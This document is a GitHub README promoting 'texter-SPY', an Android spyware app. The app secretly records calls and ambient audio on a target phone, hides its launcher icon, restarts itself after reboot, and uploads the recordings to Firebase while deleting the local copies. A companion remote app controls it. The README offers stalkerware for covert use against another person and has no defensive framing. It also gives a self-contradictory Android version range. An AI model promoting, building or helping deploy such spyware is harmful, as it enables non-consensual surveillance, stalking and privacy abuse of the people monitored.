# 🕵️‍♂️ texter-SPY 📱

texter is a sophisticated spyware application designed to monitor the target device's surroundings and call activity while running in the background. This Android Studio project is compatible with devices running API levels 26 to 28 (Android 9 and 10). Upon installation, the app hides itself from the main menu (except on Android 10) and operates discreetly in the background using Android's Service framework.

## 🚀 Features
- **Real-time Monitoring:** Tracks and records the surroundings and call activity of the host device.
- **Stealth Operation:** Disappears from the main menu after the first launch, running covertly in the background.
- **Call Monitoring:** Uses broadcast receivers to detect call events and phone restarts.
- **Remote Control:** Comes with a [remote app](https://github.com/yyuvraj54/Remort-App-spy) to manage and control the host application.
- **Cloud Storage:** Uploads recorded files to Firebase Cloud Storage, ensuring no trace on the host device.
- **Device Status:** Provides information on the host device's online status and call activity.

## 📲 Getting Started
- **Install the App:** Install texter on the target (host) device to begin monitoring.
- **Stealth Mode Activation:** After the first launch, the app hides from the main menu and continues to run in the background.
- **Call and Event Monitoring:** Utilizes broadcast receivers to monitor calls and phone restart events, reactivating automatically when needed.

## 🎮 Remote App Functionality
- **Start and Stop Recordings:** Initiate and halt recordings of calls and surroundings on the host device.
- **File Management:** Automatically uploads recordings to Firebase Cloud Storage and removes them from the host device.
- **Online Status:** Check if the host device is online.
- **Call Activity Status:** View the current call status of the host device (Idle, Incoming Call, On Call).
- **Reset Configuration:** Restore the default settings of texter on the host device to fix or prevent errors.

## ℹ️ How to Use the App
texter is an app that needs to be installed on the host phone to monitor its surroundings and call activity. Once installed, the app disappears from the main menu (except on Android 10) and operates in the background using Android's Service framework to perform monitoring tasks. 
Now this host app can be controlled using [remote app](https://github.com/yyuvraj54/Remort-App-spy).

### 📡 Monitoring and Recording
- **Broadcast Receiver:** Monitors calls and phone restart events to ensure continuous operation.
- **Services:** Utilizes Android's Service framework for background operations.

### 🌐 Remote App
The [remote app](https://github.com/yyuvraj54/Remort-App-spy) provides comprehensive control over the host device's texter application:

- **Start and Stop Recording:** Control recordings of calls and the environment while the host device is online.
- **File Access:** View and access 3gp format files uploaded by the host device.
- **Device Status:** Check the online status and current call activity of the host device.
- **Reset Configuration:** Restore default settings on the host application to ensure smooth operation.

## 📸 Screenshots (Remorte App)
<div style="overflow-x: auto; white-space: nowrap;">
    <img src="https://github.com/yyuvraj54/texter-SPY/assets/30363687/0a26acf5-76a3-4d99-8257-b045d9dddfe0" alt="Screenshot -1" style="width: 180px;">
    <img src="https://github.com/yyuvraj54/texter-SPY/assets/30363687/1accff8b-9d63-447c-b468-7db28eaa30e6" alt="Screenshot 0" style="width: 180px;">
    <img src="https://github.com/yyuvraj54/texter-SPY/assets/30363687/e93756fd-7460-43d5-8755-6e49a8bc2020" alt="Screenshot 0" style="width: 180px;">
    <img src="https://github.com/yyuvraj54/texter-SPY/assets/30363687/6e0815de-378d-4779-9218-2b76eb777145" alt="Screenshot 0" style="width: 180px;">
</div>

## ✨ Developers
**Designed and Developed by Yuvraj Singh Yadav**
- Email: yyuvraj54@gmail.com
- GitHub: [yyuvraj54](https://github.com/yyuvraj54)
